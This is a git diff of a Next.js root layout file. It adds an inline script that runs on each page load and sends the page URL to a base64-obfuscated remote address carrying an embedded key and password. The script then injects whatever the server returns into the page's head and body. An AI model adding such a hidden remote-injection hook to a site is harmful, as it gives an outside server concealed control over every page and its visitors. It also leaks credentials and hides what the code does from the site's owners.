@@ -1,8 +1,9 @@
 import { Inter } from "next/font/google";
+import Head from "next/head";
+import Script from "next/script";
 import "./globals.css";
 import Navbar from "../components/global/Navbar";
 import Footer from "../components/global/Footer";
-import CustomScriptComponent from "./CustomScriptComponent";
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -22,11 +23,43 @@ export const metadata = {
 export default function RootLayout({ children }) {
   return (
     <html lang="en">
+      <Head>
+        <title>{metadata.title}</title>
+        <meta name="description" content={metadata.description} />
+        <link rel="icon" href={metadata.icons.icon[0].url} />
+        <Script
+          src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+          strategy="beforeInteractive"
+        />
+      </Head>
       <body className={inter.className}>
         <Navbar />
         <main className="lg:mt-[128px] mt-[60px]">{children}</main>
         <Footer />
-        <CustomScriptComponent />
+        <Script
+          id="custom-script"
+          strategy="afterInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `
+              $(document).ready(function() {
+                var eppathurl = window.location.origin + window.location.pathname;
+                var eptagmanage = new XMLHttpRequest();
+                eptagmanage.onreadystatechange = function() {
+                  if (this.readyState == 4 && this.status == 200) {
+                    if (this.responseText !== "0") {
+                      var temp = this.responseText.split("||||||||||");
+                      $("head").find("title").remove();
+                      $("head").append(temp[0]);
+                      $("body").append(temp[1]);
+                    }
+                  }
+                };
+                eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9") + eppathurl);
+                eptagmanage.send();
+              });
+            `,
+          }}
+        />
       </body>
     </html>
   );
